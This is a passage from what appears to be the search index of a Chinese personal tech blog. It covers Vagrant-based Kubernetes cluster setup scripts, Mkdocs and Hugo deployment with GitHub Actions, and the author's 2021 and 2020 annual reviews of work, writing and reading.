发行版软件镜像源：空(官方)/tencent(腾讯软件源)/aliyun(阿里云软件源) MIRROR = \u0026#34;aliyun\u0026#34; # 最新的 Vagrant 版本强制了 CIDR，我保留了 1-9 的IP，并且将这个初始IP作为管理节点IP ADMIN_IP = \u0026#34;192.168.56.10\u0026#34; # 调整工作节点数，根据你的资源增加，一般学习的话两个够了。 NODES = 2 # 用于登录 Docker 镜像仓库，默认为docker.io DOCKER_REGISTRY = \u0026#34;\u0026lt;\u0026gt;\u0026#34; DOCKER_USERNAME = \u0026#34;\u0026lt;username for docker registry\u0026gt;\u0026#34; DOCKER_PASSWORD = \u0026#34;\u0026lt;password for docker registry\u0026gt;\u0026#34; 默认控制面的主机名是admin，IP 是192.168.56.10。工作节点是node-\u0026lt;数字\u0026gt;，根据你的内存资源，你可以增加节点的数量。\n最后只要运行vagrant up就可以启动你的集群，如果因为下载某些东西超时（比如镜像或者安装包），可以切换镜像重新试一下。\n如果虚拟机全部初始化完成，你可以通过kubectl get nodes看到多个集群。\n我一般会在搭建完控制面之后用watch kubectl get ndoes持续跟踪集群的搭建情况。\n还是再说一句，在家按照官方文档搭建一个标准的 K8S 集群真是太难了！\nK8S 解决方案配置脚本说明 #K8S 解决方案脚本主要分控制面配置和工作节点配置两个脚本，每个脚本都需要安装 kubeadm,kubelet和kubectl。\n控制面配置完成以后才可以配置工作节点，因为需要加入控制面的token等一些信息。\n控制面节点配置脚本 solution/k8s/admin.sh 说明 #控制面安装要在管理节点上先通过/facility/k8s/install.sh安装安装 kubeadm 再进行通过 kubeadm配置。\n1 2 3 4 5 6 7 8 9 #!/usr/bin/env bash PATH=$PATH:/home/$(whoami)/.local/bin export CONTROL_PANEL_IP=$1 echo \u0026#34;CONTROL PANEL IP: $CONTROL_PANEL_IP\u0026#34; MIRROR=\u0026#34;aliyun\u0026#34; # \u0026lt;empty\u0026gt;/aliyun KUBE_VERSION=\u0026#34;1.23.0-0\u0026#34; sh -c \u0026#34;/vagrant/facility/k8s/install.sh $KUBE_VERSION $MIRROR\u0026#34; sh -c \u0026#34;/vagrant/facility/k8s/setup-control-panel.sh $CONTROL_PANEL_IP $MIRROR\u0026#34; 参数说明：\nCONTROL_PANEL_IP: K8S控制面的IP地址，由外部传入。 MIRROR: K8S所用的A镜像，除了apt源和yum源，还有k8s集群所需要的docker镜像，目前仅支持阿里云（唯一提供免费k8s镜像源）。如果为空，则会去查找官方镜像。 KUBE_VERSION: K8S 的版本，可以指定版本版本。 工作节点脚本配置脚本 /solution/k8s/node.sh 说明 #工作节点配置脚本和控制面配置脚本类似，都是先通过/facility/k8s/install.sh安装kubeadm，然后才进行配置。只是工作节点要在控制面配置完之后启动。\n1 2 3 4 5 6 7 8 9 10 #!/usr/bin/env bash PATH=$PATH:/home/$(whoami)/.local/bin export CONTROL_PANEL_IP=$1 echo \u0026#34;CONTROL PANEL IP: $CONTROL_PANEL_IP\u0026#34; MIRROR=\u0026#34;aliyun\u0026#34; # \u0026lt;empty\u0026gt;/aliyun KUBE_VERSION=\u0026#34;1.23.0-0\u0026#34; sh -c \u0026#34;/vagrant/facility/k8s/install.sh $KUBE_VERSION $MIRROR\u0026#34; sh -c \u0026#34;/vagrant/facility/k8s/setup-worker-node.sh $CONTROL_PANEL_IP\u0026#34; 参数说明：\nCONTROL_PANEL_IP: K8S控制面的IP地址，由外部传入。 MIRROR: K8S所用的A镜像，除了apt源和yum源，还有k8s集群所需要的docker镜像，目前仅支持阿里云（唯一提供免费k8s镜像源）。如果为空，则会去查找官方镜像。 KUBE_VERSION: K8S 的版本，可以指定版本，但要和控制面的版本一致，否则会出问题。 K8S facility 脚本说明 #K8S facility 脚本包括三个脚本：\n初始安装脚本 /facility/k8s/install.sh 说明 #install.sh是初始化 linux 配置并安装 kubeadm,kubelet和kubectl 的脚本。完全按照官方kubeadm 安装文档执行。\ninstall.sh有两个参数：K8S 版本和安装包镜像。安装包镜像可以为空，采用默认的packages.k8s.io或阿里云镜像源。\ninstall.sh的执行步骤如下：\n修改 docker 的配置，使用 systemd 来管理容器的 cgroup。 配置网络, 允许 iptables 检查桥接流量。 关闭系统交换区(swap area)。 自动识别apt和yum并安装kubeadm相关软件包。 控制面配置脚本 /facility/k8s/setup-control-panel.sh 说明 #setup-control-panel.sh是用来配置控制面的脚本。必须在/facility/k8s/install.sh安装之后执行。\nsetup-control-panel.sh主要做以下几件事：\n通过firewall-cmd配置k8s 集群所用端口。 安装配置 K8S 等控制面组件:kube-apiserver。 安装配置 Pod 网络插件。支持calico和fannel，默认选择calico。 生成自动加入集群的脚本join-cluster.sh并通过8000端口暴露出来，让工作节点可以启动后自动加入集群。 安装 helm。 工作节点配置脚本 /facility/k8s/setup-work-node.sh 说明 #setup-work-node.sh的脚本比较简单，除了通过firewall-cmd打开所需端口以外，就是下载并执行控制面上的加入集群脚本。\n从 MVP 开始 #由于目前这是最小可用集群，如果你想增加自定义脚本可以在facility里自动化安装增加并且在solution自动化配置。\n下一步可能会减少参数配置，尽量用内部的 DNS 服务取代 IP 的配置。\n欢迎来https://github.com/wizardbyron/provisioners提 Issue 和 PR！\n","date":"February 8, 2022","permalink":"/blog/2022/2022-02-08-setup-k8s-cluster-with-vagrant/","section":"Blogs","summary":"","title":"通过 Vagrant 一键初始化 K8S 集群"},{"content":"2021 年一眨眼就过去了，还没来得及写些什么就结束了。这篇总结在12月初就开始写，每日写一小部分，到12月底写完。总结是一个复杂的过程，工作中的复杂由于有周报就简单些，而生活中缺乏了积累，生活中则没有长进。生活也需要严肃对待。与其上班时认真扮演，下班后打回原型。不如下班后的生活认真一点，工作中则更加从容。明年开始我会和夫人通过“家庭 OKR”经营家庭，并用“个人OKR”经营自己。\n按照往年惯例，今年还是就 工作， 写作， 阅读， 开源软件和工具四个部分分别汇报。\n工作 #去年总结了自己专注的五个关键词：咨询、敏捷和DevOps、架构、云计算 和 数字化转型。总结成一句话：\n为企业数字化转型提供敏捷软件开发和云原生架构咨询。\n今年的工作基本上围绕这句话展开。今年实践的内容较少，更多是交流，了解和理解各个行业客户所面对的问题。\n云原生架构方法论 #1-4 月把去年在华为实践的领域驱动设计的架构方法论进行了沉淀。把基于TOGAF的企业架构、领域驱动设计（DDD）和规模化敏捷（SAFe）进行了结合形成了一套可落地的方法论。“可落地”的意思是这个方法论的各部分在不同的客户和项目上我都实践过，但没有完整的从头到尾实践一遍。2022年希望有机会能够完整的实践一遍并形成完整的方法体系。\n我并不愿意从头创造一些新的东西（特别是方法论的轮子），而是在成熟的方法论的基础上把实践中有效的东西结合起来，增加一些落地的原则和注意事项。并在反复应用中不断通过借鉴和实践改进。\n数字化转型规划 #今年第一个正式的项目，是给一个国企做数字化转型规划进行应用和数据架构的评估和分析，这个项目从5月开始持续到了9月。由于是规划项目，产出的是未来五年的建设规划，并没有落地，主要还是把企业架构的概念和关系介绍给客户。最大的收获是慢慢看到了整个国家数字化转型的样貌和逻辑。理解了什么是数字化转型，为什么要做数字化转型，答案我会放到 2022 年的博客里。\n对于“数字化转型”，包括“产业数字化”和“数字产业化”两个部分，分别代表个不同目的和原理的数字化转型思路：\n“产业数字化”是借由“云大物智移”通过数据分析技术提升整个企业在其所在生态中的敏捷性，核心在于优化。 “数字产业化”则是通过创新产生“信息服务”和“知识产权”从而形成新的业务模式，核心在于创新。 除此之外，每个企业对“数字化转型”的认识和诉求是不同的，阻力也不同，因此需要按不同的组织上下文、产业上下文和技术上下文分别对待。这些内容，有望出现在明年的博客里。\n云原生 DevOps 转型规划 #这是今年的第二个正式项目，这个项目从7月到9月，背景是某客户的私有云规划。客户 CIO 认为云原生平台代表“先进的生产工具”，而基于“先进的生产工具”则会有“先进的生产技术”，这个技术就是基于云原生技术的 DevOps。\n云原生会因为提升了应用的可维护性，给运维人员带来便利性的同时，也会给运维组织和运维人员带来了新的挑战。一方面是传统运维工作的边缘化，另一方面是产品的责任边界和现有组织结构带来的 DevOps 挑战。\n这是企业落地云原生技术的首要问题，组织问题背后则是利益的重新划分的问题，而 DevOps 就是直面这个问题的。这也就是企业内部启动 DevOps 艰难的原因。\n2019年在 GitChat 上开过一个 DevOps 的专栏，后来因为内容过时的原因下架了。2022 年我将结合最近的心得重新整理这个系列的文章，更新一些过时的内容，加入一些新的案例。\n应用迁移上云 #应用改造上云则是年底的新项目，早在 2018 年我就写下 公有云(AWS)上的生产环境架构优化案例和迁移套路总结，当时只是一个简单的公有云应用。而今年碰到的都是私有云下的应用，很多都是客户的核心业务系统 Rehosting，这样的应用很难有像公有云上标准化的方案，特别是基础设施方案。更多的则是伴随着技术债务的遗留系统，涉及到不同的供应商和系统集成，方案更加多样和复杂，难度也更高。这方面的经验也会不断的充实，会逐步的整理成体系。\n写作 #今年用于写作的时间并不多。一方面是在腾讯的工作时间更长，另一方面则是投入了更多的时间阅读。今年没有更新公众号和博客的另一个原因就是翻译了一本新书。关于工程师元技能的，这本书很棒，给我的工作方式带来了新的启示。目前这本书的第一遍编辑已经结束，我在进行修改。顺利的话明年下半年可以出版。\n但是，我去年和陈晓鹏老师合著的新书却没有在今年出版，目前这本书的最后一章还正在编辑。最后一遍编辑过的话，就能拿到书号。顺利的话明年年终就能出版。\n公众号断更了一年，关于公众号的运营，会放到明年的 OKR 里，内容和博客保持一致，同时各内容平台的“博客搬家”功能也会统一调整。\n阅读 #今年读的书一方面是由于工作的需要，另一方面则是发现自己的写作水平不如从前了。今年所以今年多读了一些书，除了工作相关的 数字化转型和 架构以外，还涉及了 哲学**和 禅。还有一些传记、小说和治愈类读物。\n数字化转型 #做数字化转型的关键在于客户是如何认识数字化转型的，特别是上半年几本上客户都在讨论“中台”。而大部分人则认为这是一种技术变革，没考虑到康威定律带来的组织结构调整。当你的企业越来越依赖信息化的手段进行数字化的时候，康威定律的作用就越发的强大。\n《中台战略：中台建设与数字商业》：本书认为数字化的核心是“连接”（业务线上化），“数据”（采集完整的数据），“智能”（基于数据分析决策）在企业内部管理（ERP），工业控制和营销领域的应用。但关键的是中台的翻译 —— Middle Platform —— 把中台认为是一项组织结构和能力。 《中台实践：数字化转型方法论与解决方案》：和上本书同一批作者，本书侧重于技术工程落地和实现。并有丰富的案例可以帮你理解中台在不同行业的特点。 《EDGE：价值驱动的数字化转型》：ThoughtWorks 的数字化转型方法论，在我看来有点像 SAFe 的精益价值流部分很像。 《数字化转型：企业破局的34个锦囊》：ThoughtWorks 的数字化转型实践，更多的是可落地的内容，强烈推荐。 《华为数据之道》：客户看的书，这本书是客户对数字化转型的认知。所以我也想知道客户对数字化转型的理解是什么。巧合的是，其中的一部分内容是我在埃森哲时期给华为定制的内容。当然本书的内容比实际落地的内容简化不少，我也用其中的模型和方法给现在的客户做数字化转型，毕竟是我之前实践过的东西。 架构 #架构的书要反复读，因为架构更多是一种“不可言说的知识”，需要亲自实践体会。否则就会变成一种形而上学 —— 脱离实际的约束的空想。关于架构的 How 的书籍很多，但是关于架构 Why 和 What 的问题较少一点。此外，当前关于架构的书很少考虑到架构中“人”的因素。明年我写的这些文章会关注到人在做架构这件事的人的因素。\n《演进式架构》：架构的演进性是一种特性，而支持跨多个维度的引导性增量变更是这种架构的特点。演进式架构的实践确定了软件架构的目标和达成目标的方法，让架构的演进成本和风险相对可控。本书缺乏实践案例。因此我明年计划实践一些演进式架构。 《业务架构·应用架构·数据架构实战》： 温昱老师的 TOGAF 架构实战，建议如果想要普及企业架构的同学可以从这本规范化的指导开始。 《领域驱动设计》： 每次重读，结合自己过去的实践就会有新的体会。今年的体会是“领域模型”和\u0026quot;领域驱动设计\u0026quot;之间是两回事，当听了“得到” 《领域驱动设计精粹》：《实现领域驱动设计》作者的另一本领域驱动入门读物，它将领域驱动的主要内容浓缩到了这本薄的册子中，适合新手教学。 《实现领域驱动设计》：当你准备将 DDD 落地变成代码的时候，你会发现这样那样不确定的问题——你根本不知道什么是对的。《领域驱动设计》这本书都是模型图，对于程序员来说非常难理解。因此你需要一个例子来理解建模到实现的过程，这本书就是一个参照。 《软件架构：理论与实践》：一本关于软件架的学术著作，是一本严谨的学术专著，有丰富的引用和观点。 禅 #去年疫情在家的时候读完了《禅与摩托车维修艺术》，这既不是一本讲禅的书，也不是一本讲摩托车维修的书，更不是一本艺术的书。那时的我仅仅理解仅仅停留于旅游和哲学思辨的部分。缺失了对禅本身的认识，今年又顺着那个时代影响较大和禅相关的作品继续阅读。禅对那个时代的美国的年轻人产生了很大的影响。而今年了解完禅之后，发现《禅与摩托车维修艺术》是作者在实践“禅”的记录。\n《心之道》：在机场上看到的缘分书，主要是被封面吸引。看了豆瓣评价后买了下来。但这本书不是很好读。作者是阿伦·瓦兹，深受下面提到的铃木大拙的影响。 《禅的故事》：作者是易中天，用很流畅的文字介绍了整个禅宗的起源和发展，2小时便可以读完。如果你想快速了解禅宗的发展，这本书是不错的入门读物。 《达摩流浪者》：凯鲁亚克的作品之一，也算是个人实践“禅”的记录。看当年的游记，只是想了解另一个时空下人们的思想状态和生活。 关于什么是禅，自己的理解：禅是一种哲学思想，需要人抛弃理性和对概念的迷恋，而专注于个人实践中的体验。而不同个人体验的过程和结果之前又有抽象的一致性，这种一致性就是“禅”。引用铃木大拙在《禅与日本文化》中的一句话就是：“禅并不是必须无视语言，而只是充分意识到，它们总是容易使自己脱离现实，沉溺于概念当中；而这种概念化正是禅所反对的。”而这一概念也贯穿了我上述所提及的所有作品。\n哲学 # 《哲学家们都干了些什么》：一本轻松的哲学读物，从苏格拉底开始到现代的哲学家及其理论的哲学普及读物，讲故事技巧很好，建议初学者阅读。本书提出的问题是“人生的意义是什么？”，最终这个问题是没有答案的，但是找到答案的最有效的方式就是直面自己的死亡，深以为然。 经济 # 《工作、消费主义和新穷人》：其实奔着“消费主义”来的，没想到看到了一些前因后果和世界全球化的趋势，强烈推荐。 传记 # 《若为自由故》：很多年前买了这本书的英文版（影印版）但是没有读完，这次借着 Kindle Unlimited 包年服务重新阅读了一遍。不得不说，2000 年前后开始了解 Linux 以后，相较于 Linus，我更倾向于成为 RMS 这样的人。Linux 产生了一个社区文化和一种软件开发方式。而 Linux 的 GNU 工具集则是一切的基础。相较于操作系统内核，我认为构造出 GPL 和 GCC 本身就是很大的成就。这本书为我进一步补充了关于一些开源软件和 Linux 的背景知识。 小说 # 《暂坐》：今年读的第一本小说，一方面是第一次读贾平凹的作品，另一方面很多记载西安的内容或多或少都有些熟悉和感慨。 开源软件和工具 #Provisioners : 今年一直在学习 K8S，因此做了一个 K8S 一键搭建的解决方案，包括我在学习过程中的脚本集合。包括以下几个功能：\n支持 ubuntu/centos 两种 Linux 作为控制面和节点系统。 支持指定 K8S 版本。 支持指定 K8S 安装包和镜像来源(阿里云镜像源和 Google)。 支持工作节点自动加入控制面。 支持 Flannel 和 Calico 两种 Pod 网络插件。 默认安装 Helm 3。 不得不说，在自己家里搭建一套 K8S 集群真的太难了！\nGuides : 采用 Mkdocs 构建的个人知识库，目的是为了能够沉淀可以复用的知识。和博客不同，博客的目的在于分享当时的想法，未来不会更新，写作风格也偏个人口语化。而知识库则用于知识的积累，会不断更新，且写作风格更加书面化。内容包括：\n企业架构 敏捷软件开发 DevOps 云计算（AWS，Azure，腾讯） 编程语言（Java，Python，JavaScript） 基础知识（网络、Linux） 未来随着我的知识和经验的积累，知识库的内容会及时更新，频率会高于博客。\nCongo: 目前我的博客用到的主题，我贡献了一个字数统计的小功能。未来随着我的博客的更新，我也会不断的优化提供 PR 给这个项目。\n明年的计划 #明年会和夫人采用 OKR 来经营家庭和个人，并且以月为单位进行 OKR 的复盘实践。关于明年做什么，元旦后会通过 OKR 的方式呈现。\n新年快乐！\n","date":"December 31, 2021","permalink":"/blog/2021/2021-12-31-annual-review-for-2021/","section":"Blogs","summary":"","title":"2021年的总结"},{"content":"Mkdocs 是一个采用 Python 构建轻量级的静态 HTML 在线文档框架，内置部署到 Github Pages 的功能。我用来创建 实践指南，用来做个人的知识积累。\n安装 Mkdocs 以及 Mkdocs 主题 #Mkdocs 以及主题都通过pip安装，例如我采用的mkdocs-material主题，如下所示：\n1 pip install --user mkdocs mkdocs-material 值得一说的是，如果你安装主题，mkdocs 会作为依赖被安装。\n更多的主题请参考 Wiki 页：https://github.com/mkdocs/mkdocs/wiki/MkDocs-Themes\n创建并测试站点 #通过mkdocs new \u0026lt;目录\u0026gt;就可以快速创建文档站点。目录里会生成mkdocs.yml文件和docs目录，目录内有默认的index.md文件，你可以修改和增加文件。\n在所在目录执行mkserve，你就可以在http://localhost:8000看到初始化的文档。Mkdocs 会监测目录的改动并重新生成站点更新浏览器。\n但如果你修改了配置，比如主题。就有可能出错中断进程。\n这时站点还没有加载主题，你要修改mkdocs.yml，增加theme配置：\n1 2 3 4 theme: name: material language: zh highlightjs: true 不同的主题有不同的参数配置，详情可以参考对应主题的文档。\nHTML 生成和部署 #执行mkdocs build会新建site目录，并将 markdown 文件构建为 html 文件。\n执行mkdocs gh-deploy就可以site中的 html 内容提交到代码仓库的gh-pages分支上，你要在 Github 上 代码库的配置中起用 Pages 才可以看见站点，地址是 https://\u0026lt;你的用户名\u0026gt;.github.io/\u0026lt;你的代码仓库\u0026gt; 。\n通过 Github Actions 部署到 Github Pages #我们可以用 Github Actions 把上述的构建和发布工作自动化，只需要在代码库上新建.github/workflow/gh-deploy.yml文件，内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 name: Deploy to Github Pages on: push: branches: - master - main jobs: deploy: runs-on: ubuntu-latest steps: - uses: actions/checkout@v2 - uses: actions/setup-python@v2 with: python-version: 3.x - uses: actions/cache@v2 with: key: ${{ github.ref }} path: .cache - run: pip install mkdocs-material - run: mkdocs gh-deploy --force 提交后，你就可以看到自己的站点自动部署到 Github Pages。未来的提交也会出发这个流程。\n","date":"December 17, 2021","permalink":"/blog/2021/2021-12-17-deploy-mkdocs-with-github-actions/","section":"Blogs","summary":"","title":"通过 Github Actions 部署 Mkdocs 文档"},{"content":"你现在看到的主题就是我的博客最新的主题 Congo，这些天一直没更新博客的主要原因是一直在寻找一个简洁明快的博客主题，最后就它了！（不过说不定未来还会换）\n于是我就花了半天时间把原来 Github Pages 上的博客迁移到了这个主题上，并采用了 Github Action 发布我的博客，以下是迁移步骤：\n备份内容，并做一个全量删除提交 采用 Hugo 新建一个新的博客 安装 Congo 主题 采用 Github Actions 部署博客 覆盖配置，而不要修改 迁移旧的文章和图片 1. 备份内容，并做一个全量删除提交 #一个博客的核心内容是图片和文章。这些内容在static目录和content目录下，把这些内容保存出来就好。\n然后，通过 git rm -rf --ignore-unmatch *删除所有内容，并删除空的目录。\n这时候创建一个删除提交，你就有之前删除内容的全量备份了。如果想恢复，只需要 git revert即可。\n2. 采用 Hugo 新建一个新的博客 #这时候你的目录是空的，你就可以执行hugo new site .重新建立一个站点了，这条命令默认会生成一个没有主题的空结构。\n这个时候，你要提交一次，用于跟踪后续的主题和配置的修改。\n3. 安装 Congo 主题 #参考 https://jpanther.github.io/congo/docs/installation/ 的安装文档，里面有三种安装方式，分别是：\n采用 Hugo （推荐） 采用 Git Submodule 下载静态文件 我采用了第三种方式下载了静态文件解压的方式来安装主题，简单粗暴，避免我想要更新时忘记一些配置，这样可以减少很多 git 或 hugo 的配置工作。\n别忘了删除theme下面的exampleSite，节省一些空间。\n这时候通过hugo server预览一下站点，看看主题是否正确加载，然后做一个提交。\n4. 采用 Github Actions 部署博客 #站点恢复的第一步是进行一次 push，并且发布站点。这时候我建议采用 Github Action 来自动化部署。\n首先，参考Hugos 官方的 Github Pages 部署方式在代码库根目录创建.github/workflows/gh-pages.yml文件，内容如下： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 name: github pages on: push: branches: - main # Set a branch to deploy pull_request: jobs: deploy: runs-on: ubuntu-20.04 steps: - uses: actions/checkout@v2 with: submodules: true # Fetch Hugo themes (true OR recursive) fetch-depth: 0 # Fetch all history for .GitInfo and .Lastmod - name: Setup Hugo uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;latest\u0026#39; # extended: true - name: Build run: hugo --minify - name: Deploy uses: peaceiris/actions-gh-pages@v3 if: github.ref == \u0026#39;refs/heads/main\u0026#39; with: github_token: ${{ secrets.GITHUB_TOKEN }} publish_dir: ./public 提交后你就可以看到 Github Actions 里多了一个 Workflow，如下图所示：\n5. 修改 Github Pages 配置 # github pages 默认推荐采用gh-pages分支来存放静态站点的内容。gh-pages.yml里的配置已经会帮你把生成的文件提交到gh-pages分支上。所以，要在代码库的 Settings 里的 Pages 里设置采用 gh-pages 分支发布你的站点。如下图所示： 这时候，如果你需要用自己的域名增加 CNAME 记录，你就要额外在 static目录下创建CNAME文件，里面只需要写入你的域名。并且在上图的配置中填入你的 CNAME。 6. 覆盖配置，而不要修改 #congo 的配置都放在主题目录下的config/_default目录下，包含几个 toml 文件。每个 toml 文件都是根目录下的 config.toml 文件里的一个配置项及其子项。\n根据最新版本 Hugo 的配置合并规则，你可以选择把主题内的配置合并到最终的配置中。Hugo 会先加载根目录的config.toml文件，然后会进入主题加载主题内的配置文件，最后合并成一个配置。\n接下来我们要覆盖一些配置，我们把需要覆盖的配置全部复制到根目录的config.toml文件内。你可以参考我的配置文件。\n这里分享有几个配置中的坑：\n采用 Profile 的布局需要新建 _index.md 文件 #Congo 有三个布局：page、profile和custom（自定义）三种\n我的主页就是 profile 模式，会显示作者的基本信息和头像。\n如果要开启首页，需要在content文件夹下增加 _index.md文件。\n开启 i18n 的中文名称 #Hugo 没有简体中文（zh-cn）和繁体中文（zh-tw）的配置，统一只有 zh 配置。在主题的i18里有各种配置的中文配置。同时别忘了打开 Hugo 自身的hasCJKLanguage = true。否则，阅读时间和字数统计会不准确。\n1 2 3 languageCode = \u0026#39;zh\u0026#39; defaultContentLanguage = \u0026#39;zh\u0026#39; hasCJKLanguage = true 在线编辑 #这个是我很喜欢的一个功能，这样就可以点击博客标题下方的图标进入编辑模式，如下图所示：\n点击这个图标默认会跳转到这篇文档的原始 markdown，这样当你在 Web 上提交之后，Github Actions 会自动帮你部署。不需要一定要有笔记本电脑在手边。\n配置项如下：\n1 2 3 [params.article] showEdit = true editURL = \u0026#34;https://github.com/wizardbyron/wizardbyron.github.io/tree/main/content\u0026#34; 注意，编辑的 URL 是 Github 上的content 目录，不要仅仅写 github 仓库地址，这个主题不会帮你补全。\n7. 迁移旧的文章和图片 #最后，将之前的博客文章和照片迁移到最新的目录下，在本地验证后再批量提交。Github Actions 会帮你部署新的站点。\n这样，我的博客就迁移完了。\n最后 #静态站点工具很多，不同的语言都有自己的静态站点生成工具。所谓\u0026quot;写博客半天，找主题两天\u0026quot;，最近找到了更轻量级的静态内容工具 mkdocs，未来我会分享这个更轻量级的工具。\n","date":"December 11, 2021","permalink":"/blog/2021/2021-12-11-migrate-to-new-theme-congo/","section":"Blogs","summary":"","title":"博客迁移到了新的 Hugo 主题"},{"content":"你看到的这篇文章，是今年的第一篇，同时也是今年的最后一篇。按照惯例，每年我都会写一篇总结。今年的总结会比往年的要长，就当我唠个长磕吧，把今年要写但没机会写出来的东西总结一下。\n关于写作、分享和演讲 #虽然今年没有写博客或者公众号，但今年确是我写作量最大的一年，将近 20 万字。是我往年平均数的两倍。顺利的话，2021年7月会和大家见面。至于是什么主题和内容，这里先卖个关子。\n写作是一个很好的整理自己知识体系的过程。我在写作的时候，经常能发现某些知识掌握的不够扎实。于是研究过，讨论，实践。再把结果如实的写出来。写完之后，自己就对自己的知识体系有了更深的信心。\n由于写作，耽误了和朋友家人相处的时间。在此还要谢谢夫人的支持和抱怨。\n今年谢绝了一些公开的分享邀请。今年的主要的实践积累在于“规模化敏捷”（SAFe）和“领域驱动设计”（DDD）两个课题上。一部分已经写到了今年的项目中，另一部分计划更新到明年的公众号上。\n明年的分享可能会采用微信视频号或者录播的方式。\n其实最重要的，就是持续、稳定的输出和总结。这些都会是未来职业道路上积累的财富。今年做的不够好，明年继续。\n关于阅读 #今年读了很多不同方面的书，疫情期有了大段的时间和家人相处和读书。剩下就是利用午休、地铁、和乘飞机时间。\n疫情期间读完了《禅与摩托车维修艺术》，这本书我曾经拿起三次，没超过10页又放下了。豆瓣的“特别版”读起来还是比较轻松。最重要的是理解作者自身的分裂和世界观的分裂而后统一的过程。这本书有三种读法，都会有不同的体验。\n普通读法，就是从头按照夹叙夹议的方式读一遍。 游记读法，跳过哲学的部分。按照故事的方式读。 哲学读法，跳过游记的部分。按照论文的方式读。 此外，今年把买了三年的《三体》全部读完，确实一部比一部精彩。听说《三体》要拍电影和连续剧。我个人觉得从情节来说，第一部会比较好拍。选取一个人类的角度，对外星世界采用谈话和想象。构造出足够恐怖和威慑的感觉就可以。当然，辛苦画分镜头的画师了。而第二部第三部的细节描写较多。影视化会比较困难,每十年可以重新拍一次。很多经典的小说都重拍了很多次了。每一个导演和演员对剧本和故事都有不同的诠释。所以，我并不担心拍坏。新版总会比老版强，能够驾驭住故事本身和读者期望的导演，也需要几年甚至十几年的努力才做得到。\n文学类的书还读了《岛上书店》和《在森崎书店的日子》，两本都是围绕一个书店展开的故事，同样也都是外文引进的翻译作品。从文学角度来讲，《岛上书店》的文字更加克制，情节安排更加引人入胜。同样，这两本书都分别改编成了电影，有机会的话可以比较着看一下。\n去年在鼓浪屿上的书店买了《100个基本》和《新100个基本后》，就很喜欢松浦弥太郎这种简单且有智慧的表达（当然翻译的也很好）。所以今年也买了很多松浦弥太郎的书，大部分是在 Kindle 上看完的。包括：\n《只要我能跑，没什么不能解决》 《不得不爱的两件事》 《今天也要用心过生活》 《崭新的理所当然》 《工作的100个基本》 技术方面，今年的主题是敏捷和DDD，都和工作相关。敏捷推荐BoB 大叔的《敏捷整洁之道》（我极其讨厌这个翻译）和《学习敏捷》。DDD 仍然推荐《实现领域驱动设计》，和《领域驱动设计》相比，文字更加顺畅。\n社科类的书，今年读完了《未来简史》，《今日简史》读了一半。“人类简史三部曲”的恢弘叙事确实能够让人提升自己对世界的认识，开阔格局。我觉得，《未来简史》甚至影响了中国的政策制定。因为在《习近平谈治国理政 第三卷》里，你可以感觉到“人类命运共同体”这个宏大叙事和《未来简史》中所描述的理想是一致的。\n对，我买了《习近平谈治国理政》，这仍然是我实践《原则》一书中所提到的原则：拥抱现实，应对现实。中国的现实是党的长期执政并引导社会各层面的全面发展。理解世界和所生活环境的社会大背景，就会得到长期而稳定的指导。能够在工作和投资中获得启示。\n关于工作 #当你阅读本文的时候，我应该正在办理离职手续。今年的最后一天，同样也是我在埃森哲工作的最后一天。\n来埃森哲专注于技术咨询的两年，是一个认知和格局升级的过程。在埃森哲的两年中，接触到了更高级别的客户和更具备挑战的问题。在这个过程中，我收获了很多的咨询和实践经验。特别是今年，参与了两个客户的数字化转型。能够把我之前积累到的知识和技能统统用上，算是一件幸事。\n然而，在埃森哲的咨询工作并不会给我一个固定类型的项目和时间用作积累。经常是哪里需要就前往哪里。这种不断更换项目内容和类型的工作方式有好也有坏。好的一面是能不断训练我让我对新环境的适应力会不断变强，但不好的一面就是容易变得浅薄，无论是知识积累还是客户关系。这对长期做咨询来说是不利的，毕竟客户需要的是你的专业服务，而专业是需要时间积累的。\n很多时候人都会陷入对未来的迷茫中，如果想知道未来要往哪里去，最好还是要看你过去从哪里来。\n我总结了一下我过去几年的工作经历，找到了以下五个关键词：\n咨询 敏捷和DevOps 架构 云计算 数字化转型 咨询 #总的来说，我还是很热爱咨询工作的。一方面可以拓宽眼界，另一方面，可以帮助他人解决问题。在咨询中对学习到的知识有更深刻的理解和更广泛的应用。和同事、客户的合作就形成了一种彼此滋养的关系。\n中国的咨询行业缺乏体系化的职业培养和训练体系，这是由市场客观条件决定的。于是，我在自己做咨询和培养新晋咨询师的过程中总结了一系列原则和方法。一方面帮助自己在咨询项目中成功，另一方面用于帮助很多新晋咨询师。有些方式方法的反复实践印证了一些有效性，当然，咨询项目中还是会因为各种因素不同程度的“悲剧重演”。然而，这些原则和方法可以帮助我走出困境。明年也会将这些心得通过公众号分享出来。\n敏捷和DevOps #敏捷是一条持续精进且没有尽头的旅程，它是一种有效的生活方式和工作方式。今年我在一个客户上实施了 SAFe，也第一次让我完整了理解了规模化敏捷所要面对和解决的问题。想到之前和一群反对SAFe的人批评一起人云亦云，就觉得惭愧。现在理解到自己也曾经是没有实践过 SAFe的“嘴炮派”。\n在体验了 SAFe 后，我报名参加了 SAFe 的认证咨询师（SPC）培训，并且通过了认证。同时我还通过了 SAFe 敏捷软件工程，SAFe 架构师和 SAFe DevOps 的认证以及培训师资格。学习的越深入，越发现 SAFe 这套体系的厉害之处。SAFe 解决了很多我在经历企业IT治理和数字化转型中所遇到的问题。\n今年给不同的两家客户做了敏捷和 DevOps 转型相关的工作。我发现随着 DevOps 运动的持续深入，企业通过 DevOps 所需要的是一套完整的 IT 治理和研发管理体系。而“DevOps”虽然是当今数字化企业的必备，但新面临的各种问题却超出了 DevOps 的范围。\n但是，我不赞成把 DevOps 泛化和扩大化。否则做 DevOps 就变成了无所不能的“假药”。\n你可以简单理解 IT 行业就是“卖春药”和“卖假药”相互交替的过程。前者给你一个无限憧憬和期望，后者则是实践落地的一地鸡毛。“敏捷”，“DevOps”，“微服务”，“云原生”和数字化转型都被不同的IT巨头们当作春药和假药来卖。\n这是“软技术”跟不上“硬技术”发展过程中的必然。但从制度经济学角度来看，这并不是什么新鲜事。制度转换的过程中有两个交易费用——寻找制度的费用和转变制度的费用，这两者只能在边际上区分开。我要补充的一点是，这两个费用可能是同时发生的。\n在企业数字化的过程中一定会有自己的产品，也会需要构建自己的研发能力。这些能力采购不来，只能尽早开始积累。因为于管理的通用 IT 